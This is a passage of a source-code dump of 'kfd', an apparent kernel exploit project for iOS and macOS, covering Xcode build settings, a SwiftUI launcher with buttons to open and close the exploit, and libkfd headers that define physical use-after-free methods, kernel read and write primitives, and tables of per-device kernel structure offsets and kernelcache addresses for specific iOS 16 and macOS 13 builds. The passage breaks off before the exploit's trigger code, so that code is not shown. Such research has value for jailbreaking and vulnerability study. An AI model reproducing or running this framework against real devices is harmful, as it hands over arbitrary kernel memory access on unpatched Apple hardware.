				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 16.4;
				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
				MACOSX_DEPLOYMENT_TARGET = 13.3;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.p0up0u.kfd;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = auto;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator macosx";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "kfd/kfd-Bridging-Header.h";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		297BA1002A310AE100D1E51A /* Build configuration list for PBXProject "kfd" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				297BA1122A310AE200D1E51A /* Debug */,
				297BA1132A310AE200D1E51A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		297BA1142A310AE200D1E51A /* Build configuration list for PBXNativeTarget "kfd" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				297BA1152A310AE200D1E51A /* Debug */,
				297BA1162A310AE200D1E51A /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 297BA0FD2A310AE100D1E51A /* Project object */;
}

```

`kfd.xcodeproj/project.xcworkspace/contents.xcworkspacedata`:

```xcworkspacedata
<?xml version="1.0" encoding="UTF-8"?>
<Workspace
   version = "1.0">
   <FileRef
      location = "self:">
   </FileRef>
</Workspace>

```

`kfd.xcodeproj/project.xcworkspace/xcshareddata/IDEWorkspaceChecks.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>IDEDidComputeMac32BitWarning</key>
	<true/>
</dict>
</plist>

```

`kfd/Assets.xcassets/AccentColor.colorset/Contents.json`:

```json
{
  "colors" : [
    {
      "idiom" : "universal"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`kfd/Assets.xcassets/AppIcon.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "universal",
      "platform" : "ios",
      "size" : "1024x1024"
    },
    {
      "idiom" : "mac",
      "scale" : "1x",
      "size" : "16x16"
    },
    {
      "idiom" : "mac",
      "scale" : "2x",
      "size" : "16x16"
    },
    {
      "idiom" : "mac",
      "scale" : "1x",
      "size" : "32x32"
    },
    {
      "idiom" : "mac",
      "scale" : "2x",
      "size" : "32x32"
    },
    {
      "idiom" : "mac",
      "scale" : "1x",
      "size" : "128x128"
    },
    {
      "idiom" : "mac",
      "scale" : "2x",
      "size" : "128x128"
    },
    {
      "idiom" : "mac",
      "scale" : "1x",
      "size" : "256x256"
    },
    {
      "idiom" : "mac",
      "scale" : "2x",
      "size" : "256x256"
    },
    {
      "idiom" : "mac",
      "scale" : "1x",
      "size" : "512x512"
    },
    {
      "idiom" : "mac",
      "scale" : "2x",
      "size" : "512x512"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`kfd/Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`kfd/ContentView.swift`:

```swift
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

import SwiftUI

struct ContentView: View {
    @State private var kfd: UInt64 = 0

    private var puaf_pages_options = [16, 32, 64, 128, 256, 512, 1024, 2048]
    @State private var puaf_pages_index = 7
    @State private var puaf_pages = 0

    private var puaf_method_options = ["physpuppet", "smith", "landa"]
    @State private var puaf_method = 2

    private var kread_method_options = ["kqueue_workloop_ctl", "sem_open"]
    @State private var kread_method = 1

    private var kwrite_method_options = ["dup", "sem_open"]
    @State private var kwrite_method = 1

    var body: some View {
        NavigationView {
            Form {
                Section {
                    Picker(selection: $puaf_pages_index, label: Text("puaf pages:")) {
                        ForEach(0 ..< puaf_pages_options.count, id: \.self) {
                            Text(String(self.puaf_pages_options[$0]))
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    Picker(selection: $puaf_method, label: Text("puaf method:")) {
                        ForEach(0 ..< puaf_method_options.count, id: \.self) {
                            Text(self.puaf_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    Picker(selection: $kread_method, label: Text("kread method:")) {
                        ForEach(0 ..< kread_method_options.count, id: \.self) {
                            Text(self.kread_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    Picker(selection: $kwrite_method, label: Text("kwrite method:")) {
                        ForEach(0 ..< kwrite_method_options.count, id: \.self) {
                            Text(self.kwrite_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    HStack {
                        Button("kopen") {
                            puaf_pages = puaf_pages_options[puaf_pages_index]
                            kfd = kopen(UInt64(puaf_pages), UInt64(puaf_method), UInt64(kread_method), UInt64(kwrite_method))
                        }.disabled(kfd != 0).frame(minWidth: 0, maxWidth: .infinity)
                        Button("kclose") {
                            kclose(kfd)
                            puaf_pages = 0
                            kfd = 0
                        }.disabled(kfd == 0).frame(minWidth: 0, maxWidth: .infinity)
                    }.buttonStyle(.bordered)
                }.listRowBackground(Color.clear)
                if kfd != 0 {
                    Section {
                        VStack {
                            Text("Success!").foregroundColor(.green)
                            Text("Look at output in Xcode")
                        }.frame(minWidth: 0, maxWidth: .infinity)
                    }.listRowBackground(Color.clear)
                }
            }.navigationBarTitle(Text("kfd"), displayMode: .inline)
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}

```

`kfd/Preview Content/Preview Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`kfd/kfd-Bridging-Header.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#include "libkfd.h"

```

`kfd/kfd.entitlements`:

```entitlements
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.app-sandbox</key>
    <true/>
    <key>com.apple.security.files.user-selected.read-only</key>
    <true/>
</dict>
</plist>

```

`kfd/kfdApp.swift`:

```swift
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

import SwiftUI

@main
struct kfdApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

```

`kfd/libkfd.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "libkfd/common.h"

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
    puaf_landa,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        u64 maxfilesperproc;
    } env;
    struct {
        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kaddr;
};

struct perf {
    u64 kernel_slide;
    u64 gVirtBase;
    u64 gPhysBase;
    u64 gPhysSize;
    struct {
        u64 pa;
        u64 va;
    } ttbr[2];
    struct ptov_table_entry {
        u64 pa;
        u64 va;
        u64 len;
    } ptov_table[8];
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_landa);
    assert(kread_method <= kread_sem_open);
    assert(kwrite_method <= kwrite_sem_open);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);

    timer_end();
    return (u64)(kfd);
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

#endif /* libkfd_h */

```

`kfd/libkfd/common.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef common_h
#define common_h

#include <errno.h>
#include <mach/mach.h>
#include <pthread.h>
#include <semaphore.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/sysctl.h>
#include <unistd.h>

#define pages(number_of_pages) ((number_of_pages) * (ARM_PGBYTES))

#define min(a, b) (((a) < (b)) ? (a) : (b))
#define max(a, b) (((a) > (b)) ? (a) : (b))

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;
typedef intptr_t isize;

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef uintptr_t usize;

/*
 * Helper print macros.
 */

#if CONFIG_PRINT

#define print(args...) printf(args)

#else /* CONFIG_PRINT */

#define print(args...)

#endif /* CONFIG_PRINT */

#define print_bool(name) print("[%s]: %s = %s\n", __FUNCTION__, #name, name ? "true" : "false")

#define print_i8(name) print("[%s]: %s = %hhi\n", __FUNCTION__, #name, name)
#define print_u8(name) print("[%s]: %s = %hhu\n", __FUNCTION__, #name, name)
#define print_x8(name) print("[%s]: %s = %02hhx\n", __FUNCTION__, #name, name)

#define print_i16(name) print("[%s]: %s = %hi\n", __FUNCTION__, #name, name)
#define print_u16(name) print("[%s]: %s = %hu\n", __FUNCTION__, #name, name)
#define print_x16(name) print("[%s]: %s = %04hx\n", __FUNCTION__, #name, name)

#define print_i32(name) print("[%s]: %s = %i\n", __FUNCTION__, #name, name)
#define print_u32(name) print("[%s]: %s = %u\n", __FUNCTION__, #name, name)
#define print_x32(name) print("[%s]: %s = %08x\n", __FUNCTION__, #name, name)

#define print_i64(name) print("[%s]: %s = %lli\n", __FUNCTION__, #name, name)
#define print_u64(name) print("[%s]: %s = %llu\n", __FUNCTION__, #name, name)
#define print_x64(name) print("[%s]: %s = %016llx\n", __FUNCTION__, #name, name)

#define print_isize(name) print("[%s]: %s = %li\n", __FUNCTION__, #name, name)
#define print_usize(name) print("[%s]: %s = %lu\n", __FUNCTION__, #name, name)
#define print_xsize(name) print("[%s]: %s = %016lx\n", __FUNCTION__, #name, name)

#define print_string(name) print("[%s]: %s = %s\n", __FUNCTION__, #name, name)

#define print_message(args...) do { print("[%s]: ", __FUNCTION__); print(args); print("\n"); } while (0)
#define print_success(args...) do { print("[%s]: ðŸŸ¢ ", __FUNCTION__); print(args); print("\n"); } while (0)
#define print_warning(args...) do { print("[%s]: ðŸŸ¡ ", __FUNCTION__); print(args); print("\n"); } while (0)
#define print_failure(args...) do { print("[%s]: ðŸ”´ ", __FUNCTION__); print(args); print("\n"); } while (0)

#define print_timer(tv)                                           \
    do {                                                          \
        u64 sec = ((tv)->tv_sec);                                 \
        u64 msec = ((tv)->tv_usec) / 1000;                        \
        u64 usec = ((tv)->tv_usec) % 1000;                        \
        print_success("%llus %llums %lluus", sec, msec, usec);    \
    } while (0)

#define print_buffer(uaddr, size)                                          \
    do {                                                                   \
        const u64 u64_per_line = 8;                                        \
        volatile u64* u64_base = (volatile u64*)(uaddr);                   \
        u64 u64_size = ((u64)(size) / sizeof(u64));                        \
        for (u64 u64_offset = 0; u64_offset < u64_size; u64_offset++) {    \
            if ((u64_offset % u64_per_line) == 0) {                        \
                print("[0x%04llx]: ", u64_offset * sizeof(u64));           \
            }                                                              \
            print("%016llx", u64_base[u64_offset]);                        \
            if ((u64_offset % u64_per_line) == (u64_per_line - 1)) {       \
                print("\n");                                               \
            } else {                                                       \
                print(" ");                                                \
            }                                                              \
        }                                                                  \
        if ((u64_size % u64_per_line) != 0) {                              \
            print("\n");                                                   \
        }                                                                  \
    } while (0)

/*
 * Helper assert macros.
 */

#if CONFIG_ASSERT

#define assert(condition)                                               \
    do {                                                                \
        if (!(condition)) {                                             \
            print_failure("assertion failed: (%s)", #condition);        \
            print_failure("file: %s, line: %d", __FILE__, __LINE__);    \
            print_failure("... sleep(30) before exit(1) ...");          \
            sleep(30);                                                  \
            exit(1);                                                    \
        }                                                               \
    } while (0)

#else /* CONFIG_ASSERT */

#define assert(condition)

#endif /* CONFIG_ASSERT */

#define assert_false(message)                   \
    do {                                        \
        print_failure("error: %s", message);    \
        assert(false);                          \
    } while (0)

#define assert_bsd(statement)                                                                        \
    do {                                                                                             \
        kern_return_t kret = (statement);                                                            \
        if (kret != KERN_SUCCESS) {                                                                  \
            print_failure("bsd error: kret = %d, errno = %d (%s)", kret, errno, strerror(errno));    \
            assert(kret == KERN_SUCCESS);                                                            \
        }                                                                                            \
    } while (0)

#define assert_mach(statement)                                                             \
    do {                                                                                   \
        kern_return_t kret = (statement);                                                  \
        if (kret != KERN_SUCCESS) {                                                        \
            print_failure("mach error: kret = %d (%s)", kret, mach_error_string(kret));    \
            assert(kret == KERN_SUCCESS);                                                  \
        }                                                                                  \
    } while (0)

/*
 * Helper timer macros.
 */

#if CONFIG_TIMER

#define timer_start()                                 \
    struct timeval tv_start;                          \
    do {                                              \
        assert_bsd(gettimeofday(&tv_start, NULL));    \
    } while (0)

#define timer_end()                                 \
    do {                                            \
        struct timeval tv_end, tv_diff;             \
        assert_bsd(gettimeofday(&tv_end, NULL));    \
        timersub(&tv_end, &tv_start, &tv_diff);     \
        print_timer(&tv_diff);                      \
    } while (0)

#else /* CONFIG_TIMER */

#define timer_start()
#define timer_end()

#endif /* CONFIG_TIMER */

/*
 * Helper allocation macros.
 */

#define malloc_bzero(size)               \
    ({                                   \
        void* pointer = malloc(size);    \
        assert(pointer != NULL);         \
        bzero(pointer, size);            \
        pointer;                         \
    })

#define bzero_free(pointer, size)    \
    do {                             \
        bzero(pointer, size);        \
        free(pointer);               \
        pointer = NULL;              \
    } while (0)

#endif /* common_h */

```

`kfd/libkfd/info.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef info_h
#define info_h

#include "info/dynamic_info.h"
#include "info/static_info.h"

/*
 * Note that these macros assume that the kfd pointer is in scope.
 */
#define dynamic_info(field_name)    (kern_versions[kfd->info.env.vid].field_name)

#define dynamic_kget(field_name, object_kaddr)                                    \
    ({                                                                            \
        u64 tmp_buffer = 0;                                                       \
        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);         \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));    \
        tmp_buffer;                                                               \
    })

#define dynamic_kset(field_name, new_value, object_kaddr)                          \
    do {                                                                           \
        u64 tmp_buffer = new_value;                                                \
        u64 field_kaddr = (u64)(object_kaddr) + dynamic_info(field_name);          \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));    \
    } while (0)

#define static_kget(object_name, field_name, object_kaddr)                            \
    ({                                                                                \
        u64 tmp_buffer = 0;                                                           \
        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));        \
        tmp_buffer;                                                                   \
    })

#define static_kset(object_name, field_name, new_value, object_kaddr)                 \
    do {                                                                              \
        u64 tmp_buffer = new_value;                                                   \
        u64 field_kaddr = (u64)(object_kaddr) + offsetof(object_name, field_name);    \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));       \
    } while (0)

const char info_copy_sentinel[] = "p0up0u was here";
const u64 info_copy_sentinel_size = sizeof(info_copy_sentinel);

void info_init(struct kfd* kfd)
{
    /*
     * Initialize the kfd->info.copy substructure.
     *
     * Note that the vm_copy() call in krkw_helper_grab_free_pages() makes the following assumptions:
     * - The size of the copy must be strictly greater than msg_ool_size_small.
     * - The source object must have a copy strategy of MEMORY_OBJECT_COPY_NONE.
     * - The destination object must have a copy strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
     */
    kfd->info.copy.size = pages(4);
    assert(kfd->info.copy.size > msg_ool_size_small);
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
    for (u64 offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
    }

    /*
     * Initialize the kfd->info.env substructure.
     */
    kfd->info.env.pid = getpid();
    print_i32(kfd->info.env.pid);

    thread_identifier_info_data_t data = {};
    thread_info_t info = (thread_info_t)(&data);
    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
    kfd->info.env.tid = data.thread_id;
    print_u64(kfd->info.env.tid);

    usize size1 = sizeof(kfd->info.env.maxfilesperproc);
    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
    print_u64(kfd->info.env.maxfilesperproc);

    struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));

    char kern_version[512] = {};
    usize size2 = sizeof(kern_version);
    assert_bsd(sysctlbyname("kern.version", &kern_version, &size2, NULL, 0));
    print_string(kern_version);

    const u64 number_of_kern_versions = sizeof(kern_versions) / sizeof(kern_versions[0]);
    for (u64 i = 0; i < number_of_kern_versions; i++) {
        const char* current_kern_version = kern_versions[i].kern_version;
        if (!memcmp(kern_version, current_kern_version, strlen(current_kern_version))) {
            kfd->info.env.vid = i;
            print_u64(kfd->info.env.vid);
            return;
        }
    }

    assert_false("unsupported osversion");
}

void info_run(struct kfd* kfd)
{
    timer_start();

    /*
     * current_task()
     */
    assert(kfd->info.kaddr.current_proc);
    kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + dynamic_info(proc__object_size);
    print_x64(kfd->info.kaddr.current_proc);
    print_x64(kfd->info.kaddr.current_task);

    /*
     * current_map()
     */
    u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.current_task);
    kfd->info.kaddr.current_map = UNSIGN_PTR(signed_map_kaddr);
    print_x64(kfd->info.kaddr.current_map);

    /*
     * current_pmap()
     */
    u64 signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.current_map);
    kfd->info.kaddr.current_pmap = UNSIGN_PTR(signed_pmap_kaddr);
    print_x64(kfd->info.kaddr.current_pmap);

    if (kfd->info.kaddr.kernel_proc) {
        /*
         * kernel_task()
         */
        kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + dynamic_info(proc__object_size);
        print_x64(kfd->info.kaddr.kernel_proc);
        print_x64(kfd->info.kaddr.kernel_task);

        /*
         * kernel_map()
         */
        u64 signed_map_kaddr = dynamic_kget(task__map, kfd->info.kaddr.kernel_task);
        kfd->info.kaddr.kernel_map = UNSIGN_PTR(signed_map_kaddr);
        print_x64(kfd->info.kaddr.kernel_map);

        /*
         * kernel_pmap()
         */
        u64 signed_pmap_kaddr = static_kget(struct _vm_map, pmap, kfd->info.kaddr.kernel_map);
        kfd->info.kaddr.kernel_pmap = UNSIGN_PTR(signed_pmap_kaddr);
        print_x64(kfd->info.kaddr.kernel_pmap);
    }

    timer_end();
}

void info_free(struct kfd* kfd)
{
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
}

#endif /* info_h */

```

`kfd/libkfd/info/dynamic_info.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef dynamic_info_h
#define dynamic_info_h

struct dynamic_info {
    const char* kern_version;
    bool kread_kqueue_workloop_ctl_supported;
    bool perf_supported;
    // struct proc
    u64 proc__p_list__le_prev;
    u64 proc__p_pid;
    u64 proc__p_fd__fd_ofiles;
    u64 proc__object_size;
    // struct task
    u64 task__map;
    // struct thread
    u64 thread__thread_id;
    // kernelcache static addresses (perf)
    u64 kernelcache__cdevsw;                          // "spec_open type" or "Can't mark ptc as kqueue ok"
    u64 kernelcache__gPhysBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 kernelcache__gPhysSize;                       // (gPhysBase + 0x8)
    u64 kernelcache__gVirtBase;                       // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 kernelcache__perfmon_dev_open;                // "perfmon: attempt to open unsupported source: 0x%x"
    u64 kernelcache__perfmon_devices;                 // "perfmon: %s: devfs_make_node_clone failed"
    u64 kernelcache__ptov_table;                      // "%s: illegal PA: 0x%llx; phys base 0x%llx, size 0x%llx"
    u64 kernelcache__vn_kqfilter;                     // "Invalid knote filter on a vnode!"
};

const struct dynamic_info kern_versions[] = {
    // iOS 16.5 - iPhone 14 Pro Max
    {
        .kern_version = "Darwin Kernel Version 22.5.0: Mon Apr 24 21:09:28 PDT 2023; root:xnu-8796.122.4~1/RELEASE_ARM64_T8120",
        .kread_kqueue_workloop_ctl_supported = false,
        .perf_supported = true,
        .proc__p_list__le_prev = 0x0008,
        .proc__p_pid = 0x0060,
        .proc__p_fd__fd_ofiles = 0x00f8,
        .proc__object_size = 0x0730,
        .task__map = 0x0028,
        .thread__thread_id = 0,
        .kernelcache__cdevsw = 0xfffffff00a419208,
        .kernelcache__gPhysBase = 0xfffffff007934010,
        .kernelcache__gPhysSize = 0xfffffff007934018,
        .kernelcache__gVirtBase = 0xfffffff0079321e8,
        .kernelcache__perfmon_dev_open = 0xfffffff007eecfc0,
        .kernelcache__perfmon_devices = 0xfffffff00a457500,
        .kernelcache__ptov_table = 0xfffffff0078e7178,
        .kernelcache__vn_kqfilter = 0xfffffff007f39b28,
    },
    // iOS 16.6 - iPhone 12 Pro
    // T1SZ_BOOT must be changed to 25 instead of 17
    {
        .kern_version = "Darwin Kernel Version 22.6.0: Wed Jun 28 20:50:15 PDT 2023; root:xnu-8796.142.1~1/RELEASE_ARM64_T8101",
        .kread_kqueue_workloop_ctl_supported = false,
        .perf_supported = true,
        .proc__p_list__le_prev = 0x0008,
        .proc__p_pid = 0x0060,
        .proc__p_fd__fd_ofiles = 0x00f8,
        .proc__object_size = 0x0730,
        .task__map = 0x0028,
        .thread__thread_id = 0,
        .kernelcache__cdevsw = 0xfffffff00a4a5288,
        .kernelcache__gPhysBase = 0xfffffff0079303b8,
        .kernelcache__gPhysSize = 0xfffffff0079303c0,
        .kernelcache__gVirtBase = 0xfffffff00792e570,
        .kernelcache__perfmon_dev_open = 0xfffffff007ef4278,
        .kernelcache__perfmon_devices = 0xfffffff00a4e5320,
        .kernelcache__ptov_table = 0xfffffff0078e38f0,
        .kernelcache__vn_kqfilter = 0xfffffff007f42f40,
    },
    // macOS 13.4 - MacBook Air (M2, 2022)
    {
        .kern_version = "todo",
        .kread_kqueue_workloop_ctl_supported = false,
        .perf_supported = false,
        .proc__p_list__le_prev = 0x0008,
        .proc__p_pid = 0x0060,
        .proc__p_fd__fd_ofiles = 0x00f8,
        .proc__object_size = 0x0778,
        .task__map = 0x0028,
        .thread__thread_id = 0,
        .kernelcache__cdevsw = 0,
        .kernelcache__gPhysBase = 0,
        .kernelcache__gPhysSize = 0,
        .kernelcache__gVirtBase = 0,
        .kernelcache__perfmon_dev_open = 0,
        .kernelcache__perfmon_devices = 0,
        .kernelcache__ptov_table = 0,
        .kernelcache__vn_kqfilter = 0,
    },
    // macOS 13.5 - MacBook Air (M2, 2022)
    {
        .kern_version = "Darwin Kernel Version 22.6.0: Wed Jul  5 22:17:35 PDT 2023; root:xnu-8796.141.3~6/RELEASE_ARM64_T8112",
        .kread_kqueue_workloop_ctl_supported = false,
        .perf_supported = false,
        .proc__p_list__le_prev = 0x0008,
        .proc__p_pid = 0x0060,
        .proc__p_fd__fd_ofiles = 0x00f8,
        .proc__object_size = 0x0778,
        .task__map = 0x0028,
        .thread__thread_id = 0,
        .kernelcache__cdevsw = 0,
        .kernelcache__gPhysBase = 0,
        .kernelcache__gPhysSize = 0,
        .kernelcache__gVirtBase = 0,
        .kernelcache__perfmon_dev_open = 0,
        .kernelcache__perfmon_devices = 0,
        .kernelcache__ptov_table = 0,
        .kernelcache__vn_kqfilter = 0,
    },
};

#endif /* dynamic_info_h */

```

`kfd/libkfd/info/static_info.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef static_info_h
#define static_info_h

/*
 * makedefs/MakeInc.def
 */

#define ARM64_LINK_ADDR    0xfffffff007004000

/*
 * osfmk/arm64/proc_reg.h
 */

#define ARM_PGSHIFT    (14ull)
#define ARM_PGBYTES    (1ull << ARM_PGSHIFT)
#define ARM_PGMASK     (ARM_PGBYTES - 1ull)

#define T1SZ_BOOT    17ull

#define AP_RWNA    (0x0ull << 6)
#define AP_RWRW    (0x1ull << 6)
#define AP_RONA    (0x2ull << 6)
#define AP_RORO    (0x3ull << 6)

#define ARM_PTE_TYPE              0x0000000000000003ull
#define ARM_PTE_TYPE_VALID        0x0000000000000003ull
#define ARM_PTE_TYPE_MASK         0x0000000000000002ull
#define ARM_TTE_TYPE_L3BLOCK      0x0000000000000002ull
#define ARM_PTE_ATTRINDX          0x000000000000001cull
#define ARM_PTE_NS                0x0000000000000020ull
#define ARM_PTE_AP                0x00000000000000c0ull
#define ARM_PTE_SH                0x0000000000000300ull
#define ARM_PTE_AF                0x0000000000000400ull
#define ARM_PTE_NG                0x0000000000000800ull
#define ARM_PTE_ZERO1             0x000f000000000000ull
#define ARM_PTE_HINT              0x0010000000000000ull
